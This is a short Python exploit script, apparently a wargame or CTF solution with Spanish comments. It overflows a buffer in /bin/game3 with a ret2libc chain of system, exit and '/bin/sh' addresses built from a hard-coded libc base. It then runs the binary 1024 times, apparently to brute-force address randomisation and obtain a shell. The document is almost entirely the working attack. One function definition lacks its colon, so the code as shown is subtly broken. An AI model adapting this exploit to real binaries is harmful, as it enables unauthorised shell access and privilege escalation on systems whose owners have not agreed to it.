#!/usr/bin/python3
import struct
from subprocess import call
def prepare_address():
    direccion_libc=0xb75a1000
    #ret2lib --> EIP --> system_addr + exit_addr + bin_sh_addr
    buf = b"A"*76
    buf += struct.pack("<I", direccion_libc+0x00040310)
    buf += struct.pack("<I", direccion_libc+0x00033260)
    buf += struct.pack("<I", direccion_libc+0x00162d4c)
    return buf
def exploit()
    buffer = prepare_address()
    for i in range(0, 1024):
        call(["/bin/game3", buffer])
if __name__ == '__main__':
    exploit()
